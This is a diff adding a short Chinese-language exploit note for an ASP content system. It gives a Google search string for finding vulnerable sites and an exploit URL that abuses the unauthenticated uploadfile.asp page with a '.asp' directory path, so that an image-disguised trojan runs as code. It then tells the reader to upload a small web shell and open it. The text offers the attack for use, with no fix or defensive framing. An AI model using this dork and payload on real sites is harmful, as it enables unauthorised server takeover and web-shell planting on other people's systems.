@@ -1,0 +1,12 @@
+详细说明：程序采用的上传页uploadfile.asp未进行验证，导致建立畸形目录上传图片木马获取shell漏洞。
+
+谷歌关键字：inurl:newslist.asp?NodeCode=
+
+
+
+exp：http://www.shitsec.com/admin/uploadfile.asp?uppath=Mr.DzY.asp&upname=&uptext=form1.PicPath
+
+而且他的上传文件没有过滤导致未授权访问。
+
+直接上传小马 访问路径 查看源代码
+
